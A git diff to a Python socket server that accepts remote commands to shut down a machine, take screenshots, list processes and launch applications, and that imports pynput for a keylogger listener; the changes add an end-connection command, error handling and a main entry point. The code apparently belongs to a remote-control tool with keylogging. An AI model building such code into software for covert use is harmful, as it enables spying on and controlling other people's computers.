@@ -8,6 +8,7 @@ import logging
 from pynput import keyboard
 
 # Commands
+CMD_END_CONNECTION = 'end_connection'
 CMD_SHUTDOWN = 'shutdown'
 CMD_TAKE_SCREENSHOT = 'screenshot'
 CMD_VIEW_PROCESSES = 'view_processes'
@@ -42,27 +43,35 @@ class Server:
     self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     self.server.bind(self.addr)
     self.keylogger_listener = None
+    self.end_conn = threading.Event()
 
-  def run(self, stop):
+  def run(self):
     self.server.listen(5)
     print(f'Server is listening on {self.host}:{self.port}')
     while True:
         conn, addr = self.server.accept()
-        thread = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
+        thread = threading.Thread(target=self.handle_client, args=(conn, addr, self.end_conn,), daemon=True)
         thread.start()
-        if stop.is_set():
-          break
 
   # Handle client connection
-  def handle_client(self, conn, addr):
+  def handle_client(self, conn, addr, end_conn):
     print(f"[NEW CONNECTION] {addr} connected.")
     connected = True
     try:
       while connected:
+        # If client sends 'end_connection' command, close connection
+        if end_conn.is_set():
+          connected = False
+          break
+
         data = conn.recv(BUFFER_SIZE)
 
+        # End connection
+        if data == CMD_END_CONNECTION.encode():
+          end_conn.set()
+
         # Shutdown
-        if data == CMD_SHUTDOWN.encode():
+        elif data == CMD_SHUTDOWN.encode():
           print(f'[SHUTDOWN] {addr} requested shutdown.')
           self.shutdown(conn, addr)
 
@@ -125,7 +134,11 @@ class Server:
 
       conn.close()
       print(f"[DISCONNECTED] {addr} disconnected.")
+
     except ConnectionResetError:
+      print(f"[DISCONNECTED] {addr} disconnected.")
+      conn.close()
+    except socket.error:
       print(f"[DISCONNECTED] {addr} disconnected.")
       conn.close()
       
@@ -200,3 +213,7 @@ class Server:
 
   def start_app(self, app_name):
     os.startfile(app_name)
+
+if __name__ == '__main__':
+  server = Server()
+  server.run()
